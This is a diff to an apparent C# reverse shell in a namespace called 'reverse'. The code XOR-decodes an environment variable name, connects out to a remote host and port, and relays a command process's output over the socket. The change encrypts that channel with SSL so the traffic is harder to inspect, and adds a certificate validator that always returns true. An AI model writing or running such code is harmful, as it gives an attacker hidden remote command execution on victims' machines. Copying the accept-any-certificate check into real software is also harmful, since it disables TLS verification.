@@ -22,13 +22,14 @@ namespace reverse
                 char c = (char)(envvar[i] ^ xorkey);
                 envvar1 = envvar1 + c;
             }
-            
+
             Console.WriteLine("executing whatever is set in '{0}' pointing to {1}:{2}", envvar1,host,port);
 
             using (TcpClient client = new TcpClient(host, port))
             {
-                using (Stream stream = client.GetStream())
+                using (SslStream stream = new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(ValidateServerCertificate), null))
                 {
+                    stream.AuthenticateAsClient(server);
                     using (StreamReader rdr = new StreamReader(stream))
                     {
                         streamWriter = new StreamWriter(stream);
@@ -56,7 +57,16 @@ namespace reverse
                         }
                     }
                 }
+
+                // Let's at least try to be kind :)
+                client.Close();
             }
+        }
+
+        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
+        {
+            // 100% correct way of validating the cert. 
+            return true;
         }
 
         private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
